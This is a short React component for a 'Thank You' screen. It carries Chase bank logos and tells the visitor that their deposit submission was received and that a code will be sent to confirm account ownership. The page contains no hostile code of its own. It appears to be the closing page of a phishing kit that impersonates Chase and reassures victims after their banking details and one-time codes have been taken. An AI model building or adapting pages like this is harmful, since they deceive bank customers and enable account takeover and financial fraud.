import React from 'react'

const ThankYou = () => {
    return (
        <main style={{
      fontFamily: 'Arial, sans-serif',
      backgroundColor:'#3269a8',
      backgroundSize: 'cover',
      backgroundRepeat: 'no-repeat',
      backgroundPosition: 'center',
      height: '100%',
      width: '100%',
      zIndex:9999
          }} className=''>
          <div className="flex justify-center items-center">
        <img src="/assets/chase.png" alt="logo" className="w-80 mt-10"  />
      </div>

        <div className="container w-full sm:w-[60%] md:w-[60%] lg:w-[30%] mx-auto px-4 bg-white mb-20 ">
      <div className="flex flex-col items-center justify-center space-y-4 p-3 rounded-md shadow-xl border border-gray-100">
          <img className="w-100 " src="assets/chase1.png" alt="Chase Logo" />
          
          <div className='flex justify-center items-center flex-col'>
        <h2 className='text-5xl font-semibold font-mono mb-3 -mt-6'>Thank You!</h2>
        <span className='text-center text-sm font-font-bold'>Your deposit submission has been received, <br /> a code would be sent to confirm ownership of the account, <br /> It may take 3 - 5 working days for your funds to arrive in your account. </span>
         </div>
          </div>
          </div>
      </main>
  )
}

export default ThankYou